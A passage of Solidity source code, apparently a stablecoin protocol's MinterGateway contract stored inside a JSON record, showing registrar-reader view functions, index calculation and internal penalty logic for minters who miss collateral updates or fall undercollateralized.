getUpdateCollateralDigest(\n        address minter_,\n        uint256 collateral_,\n        uint256[] calldata retrievalIds_,\n        bytes32 metadataHash_,\n        uint256 timestamp_\n    ) external view returns (bytes32) {\n        return _getUpdateCollateralDigest(minter_, collateral_, retrievalIds_, metadataHash_, timestamp_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintProposalOf(\n        address minter_\n    ) external view returns (uint48 mintId_, uint40 createdAt_, address destination_, uint240 amount_) {\n        mintId_ = _mintProposals[minter_].id;\n        createdAt_ = _mintProposals[minter_].createdAt;\n        destination_ = _mintProposals[minter_].destination;\n        amount_ = _mintProposals[minter_].amount;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function pendingCollateralRetrievalOf(address minter_, uint256 retrievalId_) external view returns (uint240) {\n        return\n            _minterStates[minter_].isDeactivated\n                ? 0\n                : _pendingCollateralRetrievals[minter_][UIntMath.safe48(retrievalId_)];\n    }\n\n    /// @inheritdoc IMinterGateway\n    function totalPendingCollateralRetrievalOf(address minter_) external view returns (uint240) {\n        return _minterStates[minter_].isDeactivated ? 0 : _minterStates[minter_].totalPendingRetrievals;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function frozenUntilOf(address minter_) external view returns (uint40) {\n        return _minterStates[minter_].frozenUntilTimestamp;\n    }\n\n    /* ============ TTG Registrar Reader Functions ============ */\n\n    /// @inheritdoc IMinterGateway\n    function isMinterApproved(address minter_) public view returns (bool) {\n        return TTGRegistrarReader.isApprovedMinter(ttgRegistrar, minter_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isValidatorApproved(address validator_) public view returns (bool) {\n        return TTGRegistrarReader.isApprovedValidator(ttgRegistrar, validator_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function updateCollateralInterval() public view returns (uint32) {\n        return\n            UIntMath.max32(\n                UIntMath.bound32(TTGRegistrarReader.getUpdateCollateralInterval(ttgRegistrar)),\n                MIN_UPDATE_COLLATERAL_INTERVAL\n            );\n    }\n\n    /// @inheritdoc IMinterGateway\n    function updateCollateralValidatorThreshold() public view returns (uint256) {\n        return TTGRegistrarReader.getUpdateCollateralValidatorThreshold(ttgRegistrar);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintRatio() public view returns (uint32) {\n        // NOTE: It is possible for the mint ratio to be greater than 100%, but capped at 650%.\n        return UIntMath.min32(MAX_MINT_RATIO, UIntMath.bound32(TTGRegistrarReader.getMintRatio(ttgRegistrar)));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintDelay() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getMintDelay(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintTTL() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getMintTTL(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function minterFreezeTime() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getMinterFreezeTime(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function penaltyRate() public view returns (uint32) {\n        return UIntMath.bound32(TTGRegistrarReader.getPenaltyRate(ttgRegistrar));\n    }\n\n    /// @inheritdoc IMinterGateway\n    function rateModel() public view returns (address) {\n        return TTGRegistrarReader.getMinterRateModel(ttgRegistrar);\n    }\n\n    /// @inheritdoc IContinuousIndexing\n    function currentIndex() public view override(ContinuousIndexing, IContinuousIndexing) returns (uint128) {\n        // NOTE: Safe to use unchecked here, since `block.timestamp` is always greater than `latestUpdateTimestamp`.\n        unchecked {\n            return\n                // NOTE: Cap the index to `type(uint128).max` to prevent overflow in present value math.\n                UIntMath.bound128(\n                    ContinuousIndexingMath.multiplyIndicesUp(\n                        latestIndex,\n                        ContinuousIndexingMath.getContinuousIndex(\n                            ContinuousIndexingMath.convertFromBasisPoints(_latestRate),\n                            uint32(block.timestamp - latestUpdateTimestamp)\n                        )\n                    )\n                );\n        }\n    }\n\n    /* ============ Internal Interactive Functions ============ */\n\n    /**\n     * @dev    Imposes penalty on an active minter. Calling this for an inactive minter will break accounting.\n     * @param  minter_                 The address of the minter.\n     * @param  principalOfPenaltyBase_ The principal of the base for penalization.\n     * @return The principal of the imposed penalty.\n     */\n    function _imposePenalty(address minter_, uint152 principalOfPenaltyBase_) internal returns (uint112) {\n        if (principalOfPenaltyBase_ == 0) return 0;\n\n        uint32 penaltyRate_ = penaltyRate();\n\n        if (penaltyRate_ == 0) return 0;\n\n        unchecked {\n            uint256 penaltyPrincipal_ = (uint256(principalOfPenaltyBase_) * penaltyRate_) / ONE;\n\n            // As an edge case precaution, cap the penalty principal such that the resulting principal of total active\n            // owed M plus the penalty principal is not greater than the max uint112.\n            uint256 newPrincipalOfTotalActiveOwedM_ = principalOfTotalActiveOwedM + penaltyPrincipal_;\n\n            if (newPrincipalOfTotalActiveOwedM_ > type(uint112).max) {\n                penaltyPrincipal_ = type(uint112).max - principalOfTotalActiveOwedM;\n                newPrincipalOfTotalActiveOwedM_ = type(uint112).max;\n            }\n\n            // Calculate and add penalty principal to total minter's principal of active owed M\n            principalOfTotalActiveOwedM = uint112(newPrincipalOfTotalActiveOwedM_);\n\n            _rawOwedM[minter_] += uint112(penaltyPrincipal_); // Treat rawOwedM as principal since minter is active.\n\n            return uint112(penaltyPrincipal_);\n        }\n    }\n\n    /**\n     * @dev   Imposes penalty if minter missed collateral updates.\n     * @param minter_ The address of the minter.\n     */\n    function _imposePenaltyIfMissedCollateralUpdates(address minter_) internal {\n        uint112 principalOfActiveOwedM_ = principalOfActiveOwedMOf(minter_);\n\n        if (principalOfActiveOwedM_ == 0) return;\n\n        MinterState storage minterState_ = _minterStates[minter_];\n\n        (uint40 missedIntervals_, uint40 missedUntil_) = _getMissedCollateralUpdateParameters(\n            minterState_.updateTimestamp,\n            minterState_.penalizedUntilTimestamp,\n            updateCollateralInterval()\n        );\n\n        if (missedIntervals_ == 0) return;\n\n        // Save until when the minter has been penalized for missed intervals to prevent double penalizing them.\n        minterState_.penalizedUntilTimestamp = missedUntil_;\n\n        uint112 penaltyPrincipal_ = _imposePenalty(minter_, uint152(principalOfActiveOwedM_) * missedIntervals_);\n\n        if (penaltyPrincipal_ == 0) return;\n\n        emit MissedIntervalsPenaltyImposed(minter_, missedIntervals_, _getPresentAmount(penaltyPrincipal_));\n    }\n\n    /**\n     * @dev   Imposes penalty if minter is undercollateralized.\n     * @param minter_       The address of the minter.\n     * @param newTimestamp_ The timestamp of the collateral update.\n     */\n    function _imposePenaltyIfUndercollateralized(addre"
    }
  ]
}